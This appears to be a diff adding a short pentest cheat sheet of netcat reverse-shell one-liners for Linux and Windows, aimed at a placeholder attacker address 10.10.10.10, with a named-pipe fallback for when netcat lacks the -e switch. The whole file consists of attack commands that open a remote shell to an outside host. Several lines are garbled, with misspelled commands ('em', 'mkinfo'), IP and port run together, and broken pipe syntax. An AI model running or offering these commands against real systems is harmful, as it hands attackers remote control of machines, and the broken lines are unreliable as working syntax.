@@ -1,0 +1,9 @@
+nc 10.10.10.10.123 -e /bin/sh (linux reverse)
+nc 10.10.10.10.123 -e cmd.exe (win reverse)
+
+alternate
+nc -e /bin/sh 10.10.10.10 123
+
+If E switch is unavailable
+em /tmp/f;mkinfo /tmp/f;cat /tmp/f|bin/sh -i 2>&1 nc 10.10.10.10.123 >/tmp/f
+
